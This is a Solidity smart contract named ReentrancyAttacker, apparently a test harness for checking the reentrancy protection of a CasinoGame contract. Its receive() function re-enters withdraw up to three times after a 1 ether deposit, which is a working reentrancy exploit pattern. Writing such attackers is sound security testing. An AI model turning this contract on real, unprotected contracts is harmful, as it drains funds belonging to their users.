// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ICasinoGame {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev A contract designed to test reentrancy protection in the CasinoGame contract
 */
contract ReentrancyAttacker {
    ICasinoGame private immutable _casinoGame;
    uint256 private _attackCount = 0;
    uint256 private constant _ATTACK_ITERATIONS = 3;

    constructor(address casinoGameAddress) {
        _casinoGame = ICasinoGame(casinoGameAddress);
    }

    /**
     * @dev Deposits funds to the casino
     */
    function deposit() external payable {
        // Just hold the funds for now
    }

    /**
     * @dev Initiates the reentrancy attack
     */
    function attack() external {
        // Reset attack counter
        _attackCount = 0;
        
        // First, deposit some funds to the casino
        _casinoGame.deposit{value: 1 ether}();
        
        // Then try to withdraw and reenter
        _casinoGame.withdraw(1 ether);
    }

    /**
     * @dev Returns the address of this contract
     */
    function getAddress() external view returns (address) {
        return address(this);
    }

    /**
     * @dev Fallback function that gets called when receiving ETH
     * This is where the reentrancy attack happens
     */
    receive() external payable {
        // If we haven't reached our attack limit, try to reenter
        if (_attackCount < _ATTACK_ITERATIONS) {
            _attackCount++;
            _casinoGame.withdraw(1 ether);
        }
    }
} 